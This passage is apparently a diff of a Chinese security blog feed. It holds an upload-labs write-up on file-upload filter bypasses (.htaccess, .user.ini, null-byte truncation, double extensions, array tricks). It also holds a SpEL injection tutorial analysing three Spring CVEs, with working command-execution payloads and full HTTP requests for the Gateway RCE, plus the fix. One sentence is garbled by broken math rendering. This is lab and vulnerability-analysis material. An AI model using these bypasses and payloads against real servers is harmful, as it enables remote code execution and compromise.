+<h1 id="pass-04-htaccess利用">Pass-04 .htaccess利用</h1>
+<p><code>.htaccess</code>文件能够更改服务器的设置（Hypertext Access，超文本入口）<br>
+我们可以上传一个.htaccess 文件重写服务器的文件解析</p>
+<p><code>.htaccess</code>文件内容</p>
+<blockquote>
+<p>AddType application/x-httpd-php .jpg   可将jpg文件解析为php文件</p>
+</blockquote>
+<blockquote>
+<p>SetHandler application/x-httpd-php    可将其他所有文件解析为php文件</p>
+</blockquote>
+<blockquote>
+<p>&lt;FilesMatch &quot;test.png&quot;&gt;<br>
+SetHandler application/x-httpd-php<br>
+</FilesMatch></p>
+</blockquote>
+<h1 id="pass-05-userini利用apache解析特性">Pass-05 .user.ini利用+Apache解析特性</h1>
+<p>这题把<code>.htaccess</code>ban了<br>
+提示说upload目录下存在一个readme.php的文件</p>
+<p><code>.user.ini</code> 其中有两个配置，可以用来制造后门：<br>
+<code>auto_append_file</code> 、<code>auto_prepend_file</code><br>
+指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数，不过只在当前文件夹下有效<br>
+<code>auto_prepend_file=shell.png</code><br>
+接着我们访问<code>readme.php</code>，就会自动在该文件前面包含shell.png<br>
+❗<code>.user.ini</code>使用前提：Server API使用CGI/FastCGI模式，Apache默认不是这个模式。。。</p>
+<p>另解：</p>
+<pre><code class="language-php">        $file_name = trim($_FILES['upload_file']['name']);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //首尾去空
+</code></pre>
+<p>文件名设置为<code>shell.php. .</code>  即点、空格、点<br>
+这样获取的<code>$file_ext=. </code>绕过了黑名单<br>
+由于Apache的解析顺序是从右到左开始解析文件后缀的，如果最右侧扩展名不可识别，就继续往左判断。直到遇到可以解析的文件后缀为止。<br>
+即首先遇到点空格，该扩展名不可识别，继续向左判断，遇到.php，可识别</p>
+<p>访问<code>/upload/shell.php.%20</code>  (注意一定要对空格进行URL编码)</p>
+<h1 id="pass-06-大小写绕过">Pass-06 大小写绕过</h1>
+<p>对比第五题的源码，第六题少了<code>$file_ext = strtolower($file_ext); //转换为小写</code><br>
+上传文件名<code>shell.PHP</code></p>
+<h1 id="pass-07-空字符绕过">Pass-07 空字符绕过</h1>
+<p>源码少了<code>$file_name = trim($_FILES['upload_file']['name']);</code><br>
+上传文件名<code>shell.php </code>文件名后面加了空格<br>
+在windows系统下，如果文件名以&quot;.“或者空格作为结尾，系统会自动删除点与空格，那linux咋办呢<br>
+还是用<code>. .</code></p>
+<h1 id="pass-08-apache解析特性">Pass-08 Apache解析特性</h1>
+<p>源码少了<code>$file_name = deldot($file_name);//删除文件名末尾的点</code><br>
+上传文件名<code>shell.php.a</code><br>
+首先遇到.a，该扩展名不可识别，继续向左判断，遇到.php，可识别</p>
+<h1 id="pass-09-data绕过">Pass-09 ::$DATA绕过</h1>
+<p>源码少了<code>$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA</code><br>
+Windows中，文件名+<code>::$DATA</code>会把<code>::$DATA</code>之后的数据当成文件流处理<br>
+Linux环境还是用<code>. .</code>或者<code>.php.a</code></p>
+<h1 id="pass-10-没有新花样">Pass-10 没有新花样</h1>
+<h1 id="pass-11-双写绕过">Pass-11 双写绕过</h1>
+<pre><code class="language-php">        $file_name = trim($_FILES['upload_file']['name']);
+        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);
+        $temp_file = $_FILES['upload_file']['tmp_name'];
+        $img_path = UPLOAD_PATH.'/'.$file_name;        
+        if (move_uploaded_file($temp_file, $img_path)) {
+            $is_upload = true;
+        } else {
+            $msg = '上传出错！';
+        }
+</code></pre>
+<p>先trim一下，然后将文件名中出现黑名单内容的换为空<br>
+上传文件名<code>shell.pphphp</code></p>
+<h1 id="pass-12-00截断get">Pass-12 %00截断GET</h1>
+<p>终于使用了白名单</p>
+<pre><code class="language-php">if(isset($_POST['submit'])){
+    $ext_arr = array('jpg','png','gif');
+    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],&quot;.&quot;)+1);
+    if(in_array($file_ext,$ext_arr)){
+        $temp_file = $_FILES['upload_file']['tmp_name'];
+        $img_path = $_GET['save_path'].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+
+        if(move_uploaded_file($temp_file,$img_path)){
+            $is_upload = true;
+        } else {
+            $msg = '上传出错！';
+        }
+    } else{
+        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+    }
+}
+</code></pre>
+<p><code>$_GET['save_path']</code>可以控制上传路径<br>
+服务器后台采用的是move_uploaded_file()函数将上传的文件移动到新位置，该函数属于文件系统数，底层是采用C语言实现的，在C语言中，判断字符串是否结束是以空字符为标志的。因此，当上传的文件名中含有%00符号时，服务器会认为字符串到此结束，从而达到绕过的目的。</p>
+<p><strong>截断条件： PHP版本小于5.3.4, PHP的magic_quotes _gpc为OFF状态。</strong></p>
+<p>save_path=…/upload/shell.php%00</p>
+<h1 id="pass-13-00截断post">Pass-13 %00截断POST</h1>
+<p><code>$_GET['save_path']</code>换成<code>$_POST['save_path']</code><br>
+POST方式上传的数据则不会自动的对%00进行解码，所以我们需要对%00再次url解码</p>
+<h1 id="pass-14-15-16图片马文件包含">Pass-14 15 16图片马+文件包含</h1>
+<p>图片马制作<code>copy 1.png /b + shell.php /a shell.png</code><br>
+上传后访问<code>include.php</code>，将图片马包含进去<br>
+这几题都一样，只是检测文件头的函数换了</p>
+<h1 id="pass-17-18-二次渲染绕过-条件竞争">Pass-17 18  二次渲染绕过 条件竞争</h1>
+<h1 id="pass-20-move_uploaded_file特性">Pass-20 move_uploaded_file特性</h1>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);
+
+        $file_name = $_POST['save_name'];
+        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);
+
+        if(!in_array($file_ext,$deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH . '/' .$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) { 
+                $is_upload = true;
+            }else{
+                $msg = '上传出错！';
+            }
+        }else{
+            $msg = '禁止保存为该类型文件！';
+        }
+
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+</code></pre>
+<p>move_uploaded_file()有这么一个特性，会忽略掉文件末尾的 /.<br>
+<img src="https://p4d0rn.github.io/post-images/1666688612819.png" alt="" loading="lazy"><br>
+访问/upload/shell.php</p>
+<h1 id="pass-21-数组绕过">Pass-21 数组绕过</h1>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if(!empty($_FILES['upload_file'])){
+    //检查MIME
+    $allow_type = array('image/jpeg','image/png','image/gif');
+    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
+        $msg = &quot;禁止上传该类型文件!&quot;;
+    }else{
+        //检查文件名
+        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
+        if (!is_array($file)) {
+            $file = explode('.', strtolower($file));
+        }
+
+        $ext = end($file);
+        $allow_suffix = array('jpg','png','gif');
+        if (!in_array($ext, $allow_suffix)) {
+            $msg = &quot;禁止上传该后缀文件!&quot;;
+        }else{
+            $file_name = reset($file) . '.' . $file[count($file) - 1];
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH . '/' .$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $msg = &quot;文件上传成功！&quot;;
+                $is_upload = true;
+            } else {
+                $msg = &quot;文件上传失败！&quot;;
+            }
+        }
+    }
+}else{
+    $msg = &quot;请选择要上传的文件！&quot;;
+}
+</code></pre>
+<p><img src="https://p4d0rn.github.io/post-images/1666689196843.png" alt="" loading="lazy"><br>
+<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mi>m</mi><msub><mi>g</mi><mi>p</mi></msub><mi>a</mi><mi>t</mi><mi>h</mi><mi mathvariant="normal">刚</mi><mi mathvariant="normal">好</mi><mi mathvariant="normal">拼</mi><mi mathvariant="normal">接</mi><mi mathvariant="normal">成</mi><mi mathvariant="normal">‘</mi><mi>s</mi><mi>h</mi><mi>e</mi><mi>l</mi><mi>l</mi><mi mathvariant="normal">.</mi><mi>p</mi><mi>h</mi><mi>p</mi><mi mathvariant="normal">/</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">‘</mi><mi mathvariant="normal">注</mi><mi mathvariant="normal">意</mi><mi mathvariant="normal">这</mi><mi mathvariant="normal">里</mi><mi mathvariant="normal">传</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">‘</mi><mi>s</mi><mi>a</mi><mi>v</mi><msub><mi>e</mi><mi>n</mi></msub><mi>a</mi><mi>m</mi><mi>e</mi><mo>[</mo><mn>0</mn><mo>]</mo><mo>=</mo><mi>s</mi><mi>h</mi><mi>e</mi><mi>l</mi><mi>l</mi><mi mathvariant="normal">.</mi><mi>p</mi><mi>h</mi><mi>p</mi><mi mathvariant="normal">/</mi><mi mathvariant="normal">‘</mi><mi mathvariant="normal">、</mi><mi mathvariant="normal">‘</mi><mi>s</mi><mi>a</mi><mi>v</mi><msub><mi>e</mi><mi>n</mi></msub><mi>a</mi><mi>m</mi><mi>e</mi><mo>[</mo><mn>2</mn><mo>]</mo><mo>=</mo><mi>j</mi><mi>p</mi><mi>g</mi><mi mathvariant="normal">‘</mi><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">img_path刚好拼接成`shell.php/.`
+注意这里传的是`save_name[0]=shell.php/` 、`save_name[2]=jpg` 
+`</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord cjk_fallback">刚</span><span class="mord cjk_fallback">好</span><span class="mord cjk_fallback">拼</span><span class="mord cjk_fallback">接</span><span class="mord cjk_fallback">成</span><span class="mord">‘</span><span class="mord mathdefault">s</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord">.</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">p</span><span class="mord">/</span><span class="mord">.</span><span class="mord">‘</span><span class="mord cjk_fallback">注</span><span class="mord cjk_fallback">意</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">传</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">是</span><span class="mord">‘</span><span class="mord mathdefault">s</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord">.</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">p</span><span class="mord">/</span><span class="mord">‘</span><span class="mord cjk_fallback">、</span><span class="mord">‘</span><span class="mord mathdefault">s</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord">‘</span><span class="mord">‘</span></span></span></span>file[count($file) - 1]`才能为空</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[SpEL表达式注入]]></title>
+        <id>https://p4d0rn.github.io/post/spel-injection/</id>
+        <link href="https://p4d0rn.github.io/post/spel-injection/">
+        </link>
+        <updated>2022-10-17T06:30:57.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="0x01-spel简介">0x01 SpEL简介</h1>
+<p>SpEL：Spring Expression Language  一种表达式语言，支持在运行时查询和操作对象图。<br>
+类似于EL表达式，感觉就是简洁化的Java代码。<br>
+SpEL 的诞生是为了给 Spring 社区提供一种能够与Spring 生态系统所有产品无缝对接，能提供一站式支持的表达式语言。</p>
+<p>SpEL基本语法：<br>
+SpEL使用 <code>#{...}</code>作为定界符，大括号内被视为SpEL表达式，里面可以使用运算符，变量，调用方法等<br>
+使用 <code>T()</code> 运算符会调用类作用域的方法和常量<br>
+如<code>#{T(java.lang.Math)}</code>返回一个java.lang.Math类对象</p>
+<p>SpEL常用在三个地方。</p>
+<ol>
+<li>Value注解<br>
+（注：这个类要通过依赖注入才能使Value注解生效，直接new对象是不行的）</li>
+</ol>
+<pre><code class="language-java">package com.example.demo1.bean;
+
+import org.springframework.beans.factory.annotation.Value;
+import org.springframework.context.annotation.PropertySource;
+import org.springframework.stereotype.Component;
+
+@Component
+@PropertySource({&quot;classpath:/configure.properties&quot;})
+public class User {
+    @Value(&quot;${spring.user.name}&quot;)
+    public String userName; // 值来自application.properties
+    @Value(&quot;${home.dorm}&quot;)
+    public String address; // 值来自configure.properties(放在resources文件夹下)
+    @Value(&quot;#{T(java.lang.Math).random()}&quot;)
+    public double age;
+    @Value(&quot;#{systemProperties['os.name']}&quot;)
+    public String sys; // 注入操作系统属性
+}
+</code></pre>
+<pre><code class="language-properties">// configure.properties
+home.dorm=Room402,Unit4,Building3,No.34.LousyLoad
+// application.properti
+spring.user.name=Taco
+</code></pre>
+<p>输出如下：<br>
+<code>User{userName='Taco', address='Room402,Unit4,Building3,No.34.LousyLoad', age=0.5913714334107036, sys='Windows 10'}</code></p>
+<ol start="2">
+<li>XML</li>
+</ol>
+<pre><code class="language-xml">&lt;bean id=&quot;Book&quot; class=&quot;com.example.bean&quot;&gt;
+	&lt;property name=&quot;author&quot; value=&quot;#{表达式}&quot;&gt;
+&lt;/bean&gt;
+</code></pre>
+<ol start="3">
+<li>Expression接口</li>
+</ol>
+<pre><code class="language-java">@Test
+    public void spelTest() {
+        ExpressionParser parser = new SpelExpressionParser();
+        Expression expression = parser.parseExpression(&quot;('Hello '+'SpEL').concat(#end)&quot;);
+        EvaluationContext context = new StandardEvaluationContext();
+        context.setVariable(&quot;end&quot;, &quot;!&quot;);
+        System.out.println(expression.getValue(context));
+    }
+</code></pre>
+<p>输出<code>Hello SpEL!</code></p>
+<h1 id="0x02-漏洞利用">0x02 漏洞利用</h1>
+<p>实际情况下，一般都是基于上面第三种SpEL的使用场景出现的漏洞。<br>
+下面简单分析一下SpEL在求表达式值的过程</p>
+<blockquote>
+<p>1.创建解析器 new SpelExpressionParser()<br>
+2.解析表达式 parseExpression(your_expression)<br>
+3.构造上下文 new StandardEvaluationContext() 默认为这个<br>
+4.求值 expression.getValue(context)</p>
+</blockquote>
+<p>漏洞利用前提</p>
+<blockquote>
+<p>1.服务器接收用户输入的表达式<br>
+2.表达式解析之后调用了getValue<br>
+3.使用StandardEvaluationContext作为上下文对象</p>
+</blockquote>
+<pre><code class="language-java">@RestController
+public class SpELController {
+    @GetMapping(&quot;spel&quot;)
+    public String spel(@RequestParam(name=&quot;cmd&quot;)String cmd) {
+        System.out.println(&quot;Hello SpEL!!!&quot;);
+        ExpressionParser parser = new SpelExpressionParser();
+        Expression expression = parser.parseExpression(cmd);
+        Object obj = expression.getValue();
+        return obj.toString();
+    }
+}
+</code></pre>
+<p>这段代码中，可注入的点在请求参数cmd<br>
+访问<code>http://localhost:8080/spel?cmd=T(java.lang.Runtime).getRuntime().exec(%27calc%27)</code><br>
+成功弹出计算器</p>
+<h1 id="0x03-cve分析">0x03 CVE分析</h1>
+<h2 id="cve-2022-22980-spring-data-mongodb-spel表达式注入">CVE-2022-22980 Spring​ Data MongoDB SpEL表达式注入</h2>
+<blockquote>
+<p>Spring Data MongoDB应用程序在对包含查询参数占位符的SpEL表达式使用@Query或@Aggregation注解的查询方法进行值绑定时，若输入未被过滤，则易遭受SpEL注入攻击。</p>
+</blockquote>
+<p>Spring Data MongoDB是 Spring Data 项目的一部分<br>
+该项目旨在为新的数据存储提供熟悉和一致的基于Spring的编程模型，同时保留存储的特定特征和功能。</p>
+<p><strong>利用范围：</strong></p>
+<blockquote>
+<p>Spring Data MongoDB == 3.4.0<br>
+3.3.0 &lt;= Spring Data MongoDB &lt;= 3.3.4<br>
+更早或不再受支持的Spring Data MongoDB版本也受到此漏洞影响。</p>
+</blockquote>
+<p>代码环境<a href="https://github.com/p4d0rn/Java_Lab/tree/main/SpEL/CVE-2022-22980%20Spring%E2%80%8B%20Data%20MongoDB%20SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/mongoDB">点这里</a><br>
+<img src="https://p4d0rn.github.io/post-images/1665996976195.png" alt="" loading="lazy"><br>
+在<code>spring-boot-dependencies</code>里查看<code>spring-boot-starter-data-mongodb</code>版本</p>
+<p>下面开始流程分析：<br>
+在<code>org.springframework.data.mongodb.util.json.ParameterBindingJsonReader#bindableValueFor</code>处下断点<br>
+访问<code>http://localhost:8080/test?id=T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('calc')</code><br>
+第一次不会触发漏洞，程序继续，第二次来到此断点。<br>
+<img src="https://p4d0rn.github.io/post-images/1666008604623.png" alt="" loading="lazy"><br>
+首先判断<code>isRegularExpression</code>为false<br>
+取出<code>tokenValue</code>为<code>:#{?0}</code>，接着进行了一波正则匹配<br>
+<code>PARAMETER_BINDING_PATTERN = Pattern.compile(&quot;\\?(\\d+)&quot;);</code><br>
+<code>EXPRESSION_BINDING_PATTERN = Pattern.compile(&quot;[\\?:]#\\{.*\\}&quot;);</code></p>
+<p><code>PARAMETER_BINDING_PATTERN</code>匹配 <code>?</code>后面跟上的至少一个数字</p>
+<p><code>EXPRESSION_BINDING_PATTERN</code>匹配 <code>?#{xxx}</code>  或 <code>:#{xxx}</code></p>
+<p>接着取出了<code>:#{?0}</code>大括号内的内容<code>?0</code>赋给<code>expression</code><br>
+<img src="https://p4d0rn.github.io/post-images/1666008523191.png" alt="" loading="lazy"></p>
+<pre><code class="language-java">for(Matcher inSpelMatcher = PARAMETER_BINDING_PATTERN.matcher(expression); 
+inSpelMatcher.find(); 
+expression = expression.replace(inSpelMatcher.group(), this.getBindableValueForIndex(index).toString())) {
+                        index = computeParameterIndex(inSpelMatcher.group());
+    }
+</code></pre>
+<p><code>PARAMETER_BINDING_PATTERN</code>匹配得到<code>?0</code>的0即占位符<br>
+<code>getBindableValueForIndex</code>返回我们传入的payload<br>
+for循环将占位符和传入的payload替换</p>
+<p>接着进入<code>this.evaluateExpression(expression);</code><br>
+此时<code>expression</code>即<code>T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('calc')</code><br>
+<img src="https://p4d0rn.github.io/post-images/1666009171870.png" alt="" loading="lazy"><br>
+<img src="https://p4d0rn.github.io/post-images/1666009319177.png" alt="" loading="lazy"><br>
+熟悉的代码，创建解析器，解析表达式，获取表达式的值<br>
+而且上下文是<code>StandardEvaluationContext</code></p>
+<p>执行<code>getValue</code>后成功弹出计算器</p>
+<h2 id="cve-2022-22963-springcloud-function-spel表达式注入">CVE-2022-22963 SpringCloud Function SpEL表达式注入</h2>
+<p>Spring Cloud Function 是基于 Spring Boot 的函数计算框架。该项目致力于促进函数为主的开发单元，它抽象出所有传输细节和基础架构，并提供一个通用的模型，用于在各种平台上部署基于函数的软件。</p>
+<p>Spring Cloud Function是基于Spring Boot 的函数计算框架（FaaS）,当其启用动态路由functionRoute时，HTTP请求头spring.cloud.function.routing-expression参数存在SPEL表达式注入漏洞，恶意攻击者可通过此漏洞进行远程命令执行漏洞</p>
+<p><strong>利用范围：</strong><br>
+<strong>3.0.0 &lt;= Spring Cloud Function &lt;= 3.2.2</strong></p>
+<p><strong>Spring Cloud Function简介</strong><br>
+Spring Cloud 是一系列框架的集合， 内部包含了许多框架，这些框架互相协作，共同来构建**分布式系统。**SpringCloudFunction就是一个SpringBoot开发的Servless中间件（FAAS：Platform As A Service）<br>
+<img src="https://p4d0rn.github.io/post-images/1666017167065.png" alt="" loading="lazy"></p>
+<p>在<code>application.properties</code>中添加<code>spring.cloud.function.definition=functionRouter</code>表示声明式函数组合(Declarative Function Composition)<br>
+设置<code>spring.cloud.function.definition=functionRouter</code>就是使默认路由绑定具体函数交由用户进行控制。<br>
+<img src="https://p4d0rn.github.io/post-images/1666068045409.png" alt="" loading="lazy"><br>
+<img src="https://p4d0rn.github.io/post-images/1666067748518.png" alt="" loading="lazy"><br>
+跟进<code>processRequest</code><br>
+<img src="https://p4d0rn.github.io/post-images/1666067912987.png" alt="" loading="lazy"><br>
+接着跟下去<br>
+在<code>org.springframework.cloud.function.context.config#route</code>处<br>
+<img src="https://p4d0rn.github.io/post-images/1666068088525.png" alt="" loading="lazy"><br>
+获取请求头的<code>spring.cloud.function.routing-expression</code>字段<br>
+接着进入<code>functionFromExpression</code><br>
+<img src="https://p4d0rn.github.io/post-images/1666068218220.png" alt="" loading="lazy"><br>
+上下文对象是<code>StandardEvaluationContext</code>，<br>
+执行<code>getValue</code>成功弹出计算器</p>
+<h2 id="cve-2022-22947-spring-cloud-gateway-远程代码执行">CVE-2022-22947 Spring Cloud Gateway 远程代码执行</h2>
+<p>SpringCloud Gateway是基于 Spring Framework 和 Spring Boot 构建的 API 网关，旨在为微服务架构提供一种简单有效的统一的 API 路由管理方式。<strong>SpringCloud Gateway是基于WebFlux框架实现的</strong>，而<strong>WebFlux框架底层则使用了高性能的Reactor模式通信框架Netty。</strong><br>
+<img src="https://p4d0rn.github.io/post-images/1666068887491.png" alt="" loading="lazy"></p>
+<p>影响范围：</p>
+<blockquote>
+<p>Spring Cloud Gateway &lt; 3.1.1<br>
+Spring Cloud Gateway &lt; 3.0.7</p>
+</blockquote>
+<p><a href="https://github.com/spring-cloud/spring-cloud-gateway">GitHub</a>下载3.0.6版本<br>
+<code>org.springframework.cloud.gateway.support.ShortcutConfigurable#getValue</code><br>
+<img src="https://p4d0rn.github.io/post-images/1666071567899.png" alt="" loading="lazy"><br>
+这里存在可能注入的点，接着检测参数<code>entryValue</code>是否可控。<br>
+该类下的<code>normalize</code>方法调用了<code>getValue</code><br>
+<img src="https://p4d0rn.github.io/post-images/1666071970294.png" alt="" loading="lazy"><br>
+再往上回溯找到<code>normalizeProperties</code><br>
+<img src="https://p4d0rn.github.io/post-images/1666072003390.png" alt="" loading="lazy"><br>
+<code>this.properties</code>为<code>Map&lt;String, String&gt;</code>，对应的值就是我们要构造的SpEL表达式<br>
+<code>properties(Map&lt;String, String&gt; properties)</code>传入我们构造的内容<br>
+<img src="https://p4d0rn.github.io/post-images/1666072271539.png" alt="" loading="lazy"><br>
+有两个地方调用了<code>properties</code><br>
+<img src="https://p4d0rn.github.io/post-images/1666072388785.png" alt="" loading="lazy"><br>
+<img src="https://p4d0rn.github.io/post-images/1666072434612.png" alt="" loading="lazy"><br>
+再往上走会发现这两条路都殊途同归，由<code>#getRoutes</code>调用<br>
+通过添加<code>Filter</code>或者<code>Predicate</code>给对应的properties赋值<br>
+<img src="https://p4d0rn.github.io/post-images/1666072810048.png" alt="" loading="lazy"><br>
+放个PayLoad，以后再研究<br>
+<strong>添加路由，设置filter</strong></p>
+<blockquote>
+<p>POST /actuator/gateway/routes/hacktest HTTP/1.1<br>
+Host: localhost:8080<br>
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/&gt;20100101 Firefox/105.0<br>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,&gt;image/webp,<em>/</em>;q=0.8<br>
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>
+Accept-Encoding: gzip, deflate<br>
+Content-Type: application/json<br>
+Content-Length: 299<br>
+Connection: close</p>
+<p>{<br>
+&quot;id&quot;: &quot;hacktest&quot;,<br>
+&quot;filters&quot;: [{<br>
+&quot;name&quot;: &quot;AddResponseHeader&quot;,<br>
+&quot;args&quot;: {<br>
+&quot;name&quot;: &quot;Result&quot;,<br>
+&quot;value&quot;: &quot;#{new String(T(org.springframework.util.StreamUtils)&gt;.copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&gt;&gt;{&quot;calc&quot;}).getInputStream()))}&quot;<br>
+}<br>
+}],<br>
+&quot;uri&quot;: &quot;http://example.com&quot;<br>
+}</p>
+</blockquote>
+<p><strong>刷新路由</strong></p>
+<blockquote>
+<p>POST /actuator/gateway/refresh HTTP/1.1<br>
+Host: localhost:8080<br>
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/&gt;20100101 Firefox/105.0<br>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,&gt;image/webp,<em>/</em>;q=0.8<br>
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>
+Accept-Encoding: gzip, deflate<br>
+Content-Type: application/json<br>
+Content-Length: 3<br>
+Connection: close</p>
+<p>aaa</p>
+</blockquote>
+<p><strong>检索路由，得到命令执行结果</strong></p>
+<blockquote>
+<p>GET /actuator/gateway/routes/hacktest HTTP/1.1<br>
+Host: localhost:8080<br>
+Accept-Encoding: gzip, deflate<br>
+Accept: <em>/</em><br>
+Accept-Language: en<br>
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36<br>
+Connection: close<br>
+Content-Type: application/x-www-form-urlencoded<br>
+Content-Length: 0</p>
+</blockquote>
+<h1 id="0x04-漏洞修复">0x04 漏洞修复</h1>
+<p><code>SimpleEvaluationContext</code>、<code>StandardEvaluationContext</code> 是 SpEL提供的两个 <code>EvaluationContext</code><br>
+<code>SimpleEvaluationContext</code> 旨在仅支持 SpEL 语言语法的一个子集。它不包括 Java 类型引用，构造函数和 bean 引用<br>
+用<code>SimpleEvaluationContext</code>替换默认的<code>StandardEvaluationContext</code>，就能有效防止恶意SpEL表达式的执行。</p>
+<pre><code class="language-java">@RestController
+public class SpELController {
+    @GetMapping(&quot;spel&quot;)
+    public String spel(@RequestParam(name=&quot;cmd&quot;)String cmd) {
+        ExpressionParser parser = new SpelExpressionParser();
+        //只读属性
+        EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
+        Expression expression = parser.parseExpression(cmd);
+        Object obj = expression.getValue(context);
+        return obj.toString();
+    }
+}
+</code></pre>
